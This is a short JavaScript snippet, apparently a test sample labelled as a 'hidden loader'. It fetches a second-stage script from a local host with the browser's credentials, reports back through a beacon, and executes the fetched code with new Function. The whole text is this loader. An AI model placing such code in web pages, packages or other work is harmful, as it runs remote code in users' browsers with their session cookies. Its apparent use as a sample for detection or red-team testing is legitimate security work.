window.__RD3_HIDDEN_LOADER__='RD3_HIDDEN_LOADER';
fetch('http://127.0.0.1:8787/rd3-stage2.js',{credentials:'include'})
  .then((r)=>r.text())
  .then((src)=>{
    navigator.sendBeacon('http://127.0.0.1:8787/rd3-beacon','RD3_HIDDEN_LOADER');
    new Function(src)();
  });
